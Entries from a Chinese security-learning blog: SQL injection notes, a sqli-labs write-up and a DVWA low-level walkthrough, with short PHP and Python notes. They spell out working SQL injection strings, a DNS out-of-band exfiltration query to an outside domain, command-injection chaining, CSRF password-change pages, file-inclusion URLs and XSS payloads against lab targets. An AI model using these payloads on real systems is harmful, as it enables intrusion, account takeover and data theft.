最后一项参数,traceback,同样是可选的 assertAssert断言是有条件地触发异常，如果不满足则抛出AssertionError异常 相比raise，多了条件判断；但是不用像raise一样，抛出各种异常类型 assert expression[, arguments]","categories":[{"name":"笔记","slug":"笔记","permalink":"https://perfect-time.xyz/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"python学习","slug":"python学习","permalink":"https://perfect-time.xyz/tags/python%E5%AD%A6%E4%B9%A0/"}],"keywords":[{"name":"笔记","slug":"笔记","permalink":"https://perfect-time.xyz/categories/%E7%AC%94%E8%AE%B0/"}]},{"title":"sql注入笔记","slug":"sql","date":"2018-08-02T14:10:31.000Z","updated":"2022-07-05T06:59:16.000Z","comments":true,"path":"2018/08/02/sql/","link":"","permalink":"https://perfect-time.xyz/2018/08/02/sql/","excerpt":"整理一些sql手工注入要用到的知识","text":"整理一些sql手工注入要用到的知识 Sql注入原理sql注入是讲sql代码添加到应用的输入参数中的攻击，之后再将这些参数传递给后台的sql服务器加以解析并执行 Sql注入的本质是混淆数据和执行代码，使输入的数据变成可执行的语句 查询：select statement from table where condition 删除记录：delete from table where condition 更新记录：update table set field&#x3D;value where condtion 添加记录：insert into table values(values) Sql注入的产生参数为单引号的时候，语句报错，因为单引号被当做代码执行了 这就是注入的产生 Sql注入的分类注入的分类布尔注入select * from table where id&#x3D;1 and 1&#x3D;1 报错注入select * from table where id&#x3D;1 or updatexml(1,concat(0x21,database()),1) 可联合查询注入select name from user where id&#x3D;-1 union select user() 可多语句查询注入where id &#x3D;1 ; delete from user 基于时间注入select * from table where id&#x3D;1 and sleep(3) 1其实跟1&#x3D;1所产生的效果是一样的 不能使用空格的时候，使用&amp;&amp;代替 and 。 注入类型整形注入 and、or、运算符、1 like 1、1 in(1,2) 字符串注入 and、or、运算符’、1’ like ‘1 、1’ in (‘1’)# 搜索型注入 盲注基于时间select * from table where id 1 and (if(ascii(substr(database(),1,1))&#x3D;100,sleep(4),null)) 基于布尔select * from table where id &#x3D;1 and ascii(substr(database(),1,1))&#x3D;100 黑盒内联式内联式是指查询注入sql代码后，原来的查询仍然全部执行 登录绕过： user=’’’ or “=” pass=”” or “=” 终止式终止式sql语句注入是指攻击者在注入带有注释符的sql代码，将语句的一部分注释掉，注释掉的语句不会被执行 user=’’’ or “=”--” pass=任意输入 数据库结构Information_schemaschemata表：提供了当前Mysql实例中的所有数据库信息 tables表:提供了关于数据库中的表的信息，表述了表属于哪个schema，表类型，表引擎，创建时间等信息 columns：提供表中的列信息，详细表述了某张表中的所有列已经每个列信息 宽字节注入Ascii占用一个字节 Gbk编码汉字占用2个字节 Utf-8编码汉字占用3个字节 在gbk编码的值，前面加一个%aa，那么解码的时候，会先将前面的%aa和第一个编码值一起编码 addslashes函数addslashes函数使用反斜线引用字符串，将输入的字符串前面加入一个反斜杠 绕过思路 1. 在反斜杠前面再加个反斜杠，转义这个反斜杠 2. 去掉反斜杠 宽字节注入的原理是利用mysql在gbk编码的时候，会认为两个字符是一个汉字 比如在反斜杠后面加上一个%aa，mysql编码的时候会把反斜杠和%aa一起编码成一个字，这样就消除了反斜杠 用%df去跟反斜杠去结合成新的一个字 只能用于消除内联式前面的单引号，在后面的自己的Union查询语句中，不能出现单引号，否则会被变成一个字干扰查询语句，用十六进制来表示要查的表名 http://103.238.227.13:10083/?id=0%df&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# 基于约束的攻击方式插入数据时，表有长度限制，比如32位，当插入的数据超过32位时，大于32位的字符会被丢掉 如果我插入admin ~ 2 ，~为32个空格，最后插入到数据库中时，会把admin后面的空格以及最后的2全部去掉，最后的结果是相当于创建了一个新的admin账号 靶机：118.89.219.210:49163 带外通道注入dnslosdnslos dns在解析的时候会留下日志，读取多级域名的解析日志，可以用于将信息传递出去 load_file()函数load_file() 读取文件并返回文件内容为字符串 文件必须位于服务器上，必须指定完整路径的文件，且有file权限。该文件必须所有字节可读，但文件内容必须小于max_allowed_packet 如果该文件不存在或者无法读取，就会返回null 跟注入有关的用法有些场合下，load_file函数会去请求一次dns解析select load_file(‘\\\\\\\\’,(sekect hex(user()),’123.weae.sda.io\\\\abc’))根据这条语句，mysql会把user()的值和123.weae.sda.io一起带到dns服务器中进行解析，从而将攻击者想要的信息带出来 需要有一台自己的dns服务器，让受攻击的服务器来自己的dns服务器解析 通过注册一些服务商，可以获得一个域名，所有这个域名的解析都可以从服务商那里获得，比如cere的域名就是weae.sda.io 正常情况下不会在这种地方做防护，算是一种可以从里面出来的小路 如果域名长度被限制了，可以使用Mid()函数来获取 域名前缀不支持特殊字符，如*，解决方法是用hex()或者其他加密函数，获得数据之后再解密 报错注入公式and (select 1 from (select count(*),concat (user(),floor(rand(0)*2))x from information_schema.tables group by x)a )rand()用于产生一个01的随机数 floor()向下取整数 rand()生成01的函数，使用floor函数向下取整，因为随机产生的值是在0~1之间，向下取整后固定为0，再将rand*2，得到的值就是随机的0或者1，在rand()中加了0之后，比如rand(0)，之后的序列是不会变的类似于php中的播种概念，基于时间产生的一个随机数，只要时间相同，产生的随机数都是相同的，这个0就是rand的一个种子，rand(0)产生的随机数是固定不变的 count(*)访问查询语句中总共有多少条语句 group函数用于分组 报错的原理当mysql遇到select count(*) from tables group by x;语句时，会建立一个虚拟的表，表中有键值以及其对应出现的次数 开始查询数据，取数据库的数据，然后查看虚拟表是否存在，不存在则插入新记录，存在则在count（*）字段中加1 取第一条记录，执行Floor(rand(0)*2)，发现结果为0（第一次计算），查询虚拟表，发现0的键值不存在，执行插入语句，插入Floor(rand(0)*2)，这时会计算第二次，然后继续往下，当查询到的值为0，但是插入时计算的值为1，但是1已经在了，所以一定会报错 rand(0)→01 1 01 1 第一次执行的时候为0，插入的时候插入了1 ，第二次执行的时候1，第三次执行的时候是0，要插入，但是插入的时候为1，就报错了 floor(rand()*2)报错由于没有加入随机因子，所以Floor(rand()*2)是不可测的，如果出现第二次计算和第四次计算的值是一样的话，则会报错 前面几条查询不能让虚拟表一开始就插入了0,1的键值，如果存在了，无论加入多少条都不会报错了 Updatexml函数updatexml(1,concat(0x73,(version())),0) 这个函数要求第二个参数必须是xpath格式的字符串，如果不符合，则会报错 Updatexml最大长度是32位的，所以有所局限，如果长度超过了32位则不会被显示出来 持续更新中~","categories":[{"name":"web安全","slug":"web安全","permalink":"https://perfect-time.xyz/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://perfect-time.xyz/tags/sql%E6%B3%A8%E5%85%A5/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://perfect-time.xyz/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"php学习笔记-核心编程","slug":"phpstudy-3","date":"2018-07-29T08:28:56.000Z","updated":"2022-07-05T06:58:32.000Z","comments":true,"path":"2018/07/29/phpstudy-3/","link":"","permalink":"https://perfect-time.xyz/2018/07/29/phpstudy-3/","excerpt":"珍爱生命，远离php","text":"珍爱生命，远离php 前台后台数据的提交前台数据的提交getget方式就是将表单元素的name属性值与用户输入的数据，组织成对的形式，放在url传递到所请求的文件 直接在url上修改参数，可以模仿get方式提交数据 postpost方式就是将表单元素的name属性值与用户输入的数据，组织成对的形式，放在http协议中传递到所请求的文件 &lt;form action=&quot;8j.php&quot; method=&quot;post&quot;&gt; //method改为get就为get方式提交 &lt;label for=&quot;name&quot;&gt;用户名&lt;input type=&quot;text&quot; name=&quot;name&quot; id=&quot;name&quot;&gt;&lt;/label&gt;&lt;br/&gt; &lt;label for=&quot;name&quot;&gt;密码&lt;input type=&quot;text&quot; name=&quot;pwd&quot; id=&quot;pwd&quot;&gt;&lt;/label&gt;&lt;br/&gt; &lt;input type=&quot;submit&quot; name=&quot;提交&quot;&gt; 后台数据的接受$_GET用于接收前台使用GET方式提交的数据 将前台传递过来的各个名值对中的名作为关联数组元素的键名，名值对中的值，作为关联数组元素的键值 $name = $_GET[&#39;name&#39;]; $pwd = $_GET[&#39;pwd&#39;]; $_POST用于接收前台使用POST方式提交的数据 接收数据的方式个GET方式一样，只是存放数据的位置不一样 $name = $_POST[&#39;name&#39;]; $pwd = $_POST[&#39;pwd&#39;]; $_REQUEST同时能够接受POST和GET方式提交的数据 特殊表单的提交对于复选框，在编写html时，需要在name属性值后面加[]，这个[]符号一旦被php接收后，会自动转换为数组","categories":[{"name":"笔记","slug":"笔记","permalink":"https://perfect-time.xyz/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://perfect-time.xyz/tags/php%E5%AD%A6%E4%B9%A0/"}],"keywords":[{"name":"笔记","slug":"笔记","permalink":"https://perfect-time.xyz/categories/%E7%AC%94%E8%AE%B0/"}]},{"title":"sqli-libs解题思路-Basic Challenges","slug":"sqli-labs","date":"2018-07-27T12:15:35.000Z","updated":"2022-07-05T06:59:22.000Z","comments":true,"path":"2018/07/27/sqli-labs/","link":"","permalink":"https://perfect-time.xyz/2018/07/27/sqli-labs/","excerpt":"sqlmap之下，众生平等","text":"sqlmap之下，众生平等 less-1先是查询界面输入?id&#x3D;’，报错大致能判断是一个字符型注入，输入id&#x3D;1’ and ‘1’&#x3D;’1测试一下有没有过滤注释符，在get方式输入#时，必须将#手动url编码成%23,因为用get方式传值时，#被认为是分割字符串，不会被当成数据用于查询数据库没有过滤注释符的字符型注入，用截断式来注入，先用order by判断有几个字段3列，接下来爆表名,注意要把id后面的参数改为0，不然不会爆出union后面的数据?id=0&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23接下来就爆列名了，对referers这个表有点好奇，于是就选用这个表?id=0&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;referers&#39; #居然没有爆出数据，检查之后发现语句没有问题，数据库中这个表本身就没有数据,太懒惰了最后还是换成了user表?id=0&#39; union select 1,group_concat(username),group_concat(password) from users %23 持续更新中~","categories":[{"name":"web安全","slug":"web安全","permalink":"https://perfect-time.xyz/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"sqli-libs","slug":"sqli-libs","permalink":"https://perfect-time.xyz/tags/sqli-libs/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://perfect-time.xyz/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"基于DVWA的web漏洞原理-low","slug":"dvwa-low","date":"2018-07-19T12:09:16.000Z","updated":"2022-07-05T06:58:02.000Z","comments":true,"path":"2018/07/19/dvwa-low/","link":"","permalink":"https://perfect-time.xyz/2018/07/19/dvwa-low/","excerpt":"php看的我眼睛都瞎了","text":"php看的我眼睛都瞎了 Brute Force暴力破解 核心代码： &lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) &#123; // 获取用户名 $user = $_GET[ &#39;username&#39; ]; // 获取密码 $pass = $_GET[ &#39;password&#39; ]; //用md5加密 $pass = md5( $pass ); // 连接数据库 $query = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; //将结果保存到结果集中，如果错误，则输出一条错误信息并退出脚本 $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); //判断结果集是否为1 if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // 获取数据库中的用户信息 $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // 登录成功 $html .= &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; $html .= &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // 登录失败 $html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; 服务器对输入的username与password没有做限制，这就存在sql注入漏洞 关键点在于&quot;SELECT * FROM &#39;users&#39; WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot; 这条语句 当用户输入的username的值为admin’ or ‘1’&#x3D;’1时，整条语句就会变为&quot;SELECT * FROM &#39;users&#39; WHERE user = &#39;admin&#39; or &#39;1&#39;=&#39;1&#39; AND password = &#39;$pass&#39;;&quot;这条语句的逻辑为当user为admin或者当1&#x3D;1为真时，整条语句为真 然而1&#x3D;1永远为真，所以整条语句为真 语句返回一个true，即1，存到结果集中，这与输入正确的用户名和密码导致的结果是一样的 结果就是攻击者不需要知道admin的密码就登录了admin的账号 Command Injection远程命令注入 核心代码： &lt;?php if( isset( $_POST[ &#39;Submit&#39; ] ) ) &#123; // 获取输入的值 $target = $_REQUEST[ &#39;ip&#39; ]; // 确定操作系统并执行ping命令 if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123; // Windows $cmd = shell_exec( &#39;ping &#39; . $target ); &#125; else &#123; // linux $cmd = shell_exec( &#39;ping -c 4 &#39; . $target ); &#125; // 反馈给用户 echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; stristr（）函数在php中为忽略大小写 php_uname（）函数返回运行php系统有关的信息，参数s为返回系统的名称 原理也是过滤不严，没有对输入的值进行检查 直接在输入的ip地址后面加上&amp;、&amp;&amp;、|、||，加上自己想要执行的命令就行 拼接符号A &amp; B 简单的拼接，AB之间并无制约关系 A &amp;&amp; B A执行成功才会执行B A | B A的输出作为B的输入 A || B A执行失败才会执行B 常用命令ipconfig 查看本地网络 net user 查看系统用户 dir 查看当前目录 find 查找包含指定字符的行 whoami 查看系统当前有效用户名 CSRF跨站点请求伪造 核心代码： &lt;?php if( isset( $_GET[ &#39;Change&#39; ] ) ) &#123; // 获取输入的值 $pass_new = $_GET[ &#39;password_new&#39; ]; $pass_conf = $_GET[ &#39;password_conf&#39; ]; // 检测密码是否匹配 if( $pass_new == $pass_conf ) &#123; // 匹配成功 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // 密码不匹配 echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; CSRF原理CSRF通过伪装来自受信任用户的请求来访问受信任的网站 1.当用户A访问了受信任的网站B 2.在打开B网页没有关闭的情况下又去访问了C 3.C利用A在B中未过期的cookie，发出一些请求代码来访问B 4.这样C就能在A不知情的情况下利用A的身份访问了B 而在上面的核心代码中，服务器收到请求后，只会检查两次输入的密码是否相同，没有任何防御CSRF的机制 利用方法构造urlhttp://localhost:8888/dvwa/vulnerabilities/csrf/password_new=password&amp;password_conf=password&amp;Change=Change#当受害者点击了这个url，他的密码就会被改成password 然而实际运用中，受害者点击这个url之后就会返回一个修改密码成功的界面，所以这个方法并不好用 构造攻击页面在自己的服务器上构造一个html页面 &lt;img src=&quot;http://localhost:8888/dvwa/vulnerabilities/csrf/?? password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt; &lt;h1&gt;404&lt;h1&gt; &lt;h2&gt;file not found.&lt;h2&gt; 当受害者访问这个页面时，会以为访问了一个失效的url，但实际上密码已经被篡改 File Inclusion文件包含 核心代码： &lt;?php // 传入选择的参数 $file = $_GET[ &#39;page&#39; ]; ?&gt; 核心代码很简单，由用户选择文件，服务器去包含执行这些文件 服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。 利用方法构造url：http://localhost:8888/dvwa/vulnerabilities/fi/?page=phpinfo.php服务器会将phpinfo的内容显示在页面上 远程文件包含当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件 在远程服务xx.xx.xx.xx上上传一个文件phpinfo.php 内容如下 &lt;?php phpinfo (); ?&gt; 构造url：http://localhost:8888/dvwa/vulnerabilities/fi/?page=heep://xx.xx.xx.xx/phpinfo.php即可访问 File Upload文件上传 核心代码： &lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123; // 上传的路径和文件名 $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); // 文件是否能移动到新位置，用于检查文件是否上传成功 if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) &#123; // 不能移动 echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; &#125; else &#123; // 可以移动 echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; ?&gt; 对上传的文件没有任何的检查和过滤，只要上传php文件就可以获取服务器的webshell权限 Insecure CAPTCHA不安全的验证码 核心代码： &lt;?php //检查验证码是否正确 if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;1&#39; ) ) &#123; // 隐藏验证码窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // 从第三方获取验证码 $resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39;], $_POST[&#39;g-recaptcha-response&#39;] ); // 检查输入的验证码是否正确 if( !$resp ) &#123; // 输入的验证码错误 $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; &#125; else &#123; // 检查输入的两个新密码是否匹配 if( $pass_new == $pass_conf ) &#123; // 两个密码匹配 $html .= &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\\&quot;#\\&quot; method=\\&quot;POST\\&quot;&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;step\\&quot; value=\\&quot;2\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_new\\&quot; value=\\&quot;&#123;$pass_new&#125;\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_conf\\&quot; value=\\&quot;&#123;$pass_conf&#125;\\&quot; /&gt; &lt;input type=\\&quot;submit\\&quot; name=\\&quot;Change\\&quot; value=\\&quot;Change\\&quot; /&gt; &lt;/form&gt;&quot;; &#125; else &#123; // 两个密码不匹配 $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; &#125; &#125; &#125; //当验证码检查通过 if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;2&#39; ) ) &#123; // 隐藏验证窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // 检查密码是否匹配 if( $pass_new == $pass_conf ) &#123; // 密码匹配 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); // 反馈给用户 $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // 密码不匹配 $html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; reCAPTCHA验证流程客户端的请求验证码的模块先发送请求到google的服务器上 服务器返回验证码 用户发送验证码到网站的服务器 网站服务器将受到的验证码发给google服务器进行核对 绕过修改参数核心代码中，当step验证码通过时，会将step的值从1修改为2 因为中间没有做其他防护，攻击者要做的事很简单，只要用bp抓包，将step的值修改为2就好了 CSRF构造html &lt;body onload=&quot;document.getElementById(&#39;transfer&#39;).submit()&quot;&gt; &lt;div&gt; &lt;form method=&quot;POST&quot; id=&quot;transfer&quot; action=&quot;http://localhost:8888/dvwa/vulnerabilities/captcha/&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;step&quot; value=&quot;2&quot; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 受害者访问这个页面密码就会被改掉 SQL Injection Sourcesql注入 核心代码: &lt;?php if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) &#123; // 获取输入的值 $id = $_REQUEST[ &#39;id&#39; ]; // 连接数据库，将查询的结果放入结果集中 $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); // 获取结果集中的值 while( $row = mysqli_fetch_assoc( $result ) ) &#123; $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // 显示给用户 echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); &#125; ?&gt; 原理同暴力破解，因为没有对输入的参数id进行过滤，攻击者可以通过修改id的值来更改sql查询语句，但是实际运用中攻击者是不知道服务器端的查询语句的，这就需要一个个猜了 手工注入的大致流程1.判断注入点可以用2-1、1&#x3D;1之类的逻辑判断来寻找是否有注入点 2.查询表的列数利用order by来判断列数 Order by num来判断 1′ or 1&#x3D;1 order by 2 3.联合查询知道列名之后开始联合查询 比如列数为2 Union select version(),database() 4.爆表名1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() 5.爆列名1′ union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ 6.爆数据1′ or 1&#x3D;1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users SQL Injection (Blind)sql盲注 核心代码： &lt;?php if( isset( $_GET[ &#39;Submit&#39; ] ) ) &#123; // 获取输入的值 $id = $_GET[ &#39;id&#39; ]; // 连接数据库，将查询的结果放入结果集中 $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &#39;or die&#39; to suppress mysql errors // 获取结果集中的值 $num = @mysqli_num_rows( $result ); if( $num &gt; 0 ) &#123; // 反馈给用户 echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; &#125; else &#123; // 没有找到用户，返回一个错误页面 header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); // 客户端返回的错误提示 echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; 盲注的原理跟注入是一样的，区别在于没有从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知 这个时候我们就要用到ascii(）和substr（）函数来一个个猜 如果页面会返回正确或者错误的信息，可以基于布尔盲注，由返回的页面来判断是否猜对 如果没有返回信息，只能用sleep（）基于时间盲注，由响应的时间来判断是否正确 Weak Session IDs弱Session的id 核心代码： &lt;?php $html = &quot;&quot;; //获取session id if ($_SERVER[&#39;REQUEST_METHOD&#39;] == &quot;POST&quot;) &#123; //如果没有session id则将session id设为0 if (!isset ($_SESSION[&#39;last_session_id&#39;])) &#123; $_SESSION[&#39;last_session_id&#39;] = 0; &#125; //累加session id $_SESSION[&#39;last_session_id&#39;]++; $cookie_value = $_SESSION[&#39;last_session_id&#39;]; //向客户端发送一个http cookie setcookie(&quot;dvwaSession&quot;, $cookie_value); &#125; ?&gt; session id的原理密码与证书等认证手段，一般仅仅用于登录（Login）的过程。当登陆完成后，用户访问网站的页面，不可能每次浏览器请求页面时都再使用密码认证一次。因此，当认证完成后。就需要替换一个对用户透明的凭证。这个凭证就是SessionID。当用户登陆完成后，在服务器端就会创建一个新的会话（Session），会话中会保存用户的状态和相关信息。此时的认证，只需要知道是哪个用户在浏览当前的页面即可。 SessionID一旦在生命周期内被窃取，攻击者利用这个id就可以伪装成合法的用户访问服务器 利用方法由核心代码可知服务器的sessionid是从0开始累加的 当受害者获得sessionid之后，攻击者只要在自己的浏览器上将sessionid改为受害者的即可 按f12打开控制台，在控制台输入 读取：document.cookie; 修改：document.cookie[“Key”]&#x3D;”值”; PS：我在自己的电脑上没有成功，可能是服务器设置的问题，两个浏览器获取到的sessionid是独立的 XSS(DOM)XSS漏洞原理xss漏洞的原理是将js代码恶意插入到网页中，当受害者访问页面时，恶意的代码就会在浏览器上执行 根据恶意的代码是否存储在服务器中，xss可以分为两种类型，一种是反射性xss，一种是存储型xss DOM型由于其特殊性，常被分为第三种,它是基于DOM文档对象模型的一种漏洞 在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。 绕过DOM型服务器端没有代码 只要在get获取到的参数后面加上js代码就行 http://localhost:8888/dvwa/vulnerabilities/xss_d/?default=English&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; 结果就是会出现一个弹框，内容为xss 修改xss里面的内容，改成各种函数，可以达到盗取服务器信息的目的 ps：在谷歌浏览器上做会失败，因为谷歌浏览器自带了防xss的机制，用火狐浏览器就可以做到了 XSS (Reflected)反射型xss 核心代码: &lt;?php //向客户端发送原始的 HTTP 报头 header (&quot;X-XSS-Protection: 0&quot;); // 检测get中是否有值 if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) &#123; // 反馈给用户 echo &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;; &#125; 原理同DOM型XSS 在框里输入&lt;script&gt;alert(/xss/)&lt;/script&gt;出现弹框 XSS (Stored)存储型xss 核心代码： &lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123; //获取输入的值 $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name = trim( $_POST[ &#39;txtName&#39; ] ); // 净化输入的信息，比如消除反斜杠，检测输入的值是否为对象等 $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 净化输入的名称，同上 $name = 